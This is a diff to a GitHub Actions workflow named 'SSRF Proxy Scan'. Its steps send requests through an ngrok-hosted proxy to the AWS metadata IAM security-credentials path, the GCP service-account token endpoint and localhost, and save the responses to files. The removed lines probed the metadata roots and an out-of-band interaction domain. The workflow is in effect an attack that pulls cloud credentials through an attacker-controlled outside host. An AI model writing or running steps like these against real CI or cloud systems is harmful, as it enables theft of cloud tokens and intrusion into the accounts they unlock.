@@ -1,24 +1,24 @@
-name: SSRF Scanner
+name: SSRF Proxy Scan
 
 on:
   workflow_dispatch:
 
 jobs:
-  ssrf-test:
+  ssrf-via-proxy:
     runs-on: ubuntu-latest
     steps:
-      - name: Curl to AWS Metadata via Flask Redirect
+      - name: SSRF to AWS metadata via proxy
         run: |
-          curl -v "https://cd13e3febd7f.ngrok-free.app/meta?target=http://169.254.169.254/latest/meta-data/"
+          curl -s "https://cd13e3febd7f.ngrok-free.app/proxy?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/" | tee aws.txt
 
-      - name: Curl to GCP Metadata via Flask Redirect
+      - name: SSRF to GCP metadata via proxy
         run: |
-          curl -v "https://cd13e3febd7f.ngrok-free.app/meta?target=http://metadata.google.internal"
+          curl -s "https://cd13e3febd7f.ngrok-free.app/proxy?target=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | tee gcp.txt
 
-      - name: Curl to Interactsh via Flask Redirect
+      - name: SSRF to localhost
         run: |
-          curl -v "https://cd13e3febd7f.ngrok-free.app/meta?target=https://d2anq5a9io6mpv2l55g0wxshdz9mzn8k4.oast.me"
+          curl -s "https://cd13e3febd7f.ngrok-free.app/proxy?target=http://127.0.0.1:80" | tee localhost.txt
 
-      - name: Direct Ping to Flask /ping endpoint
+      - name: Ping Bait Server
         run: |
-          curl -v "https://cd13e3febd7f.ngrok-free.app/ping"
+          curl -s "https://cd13e3febd7f.ngrok-free.app/ping"
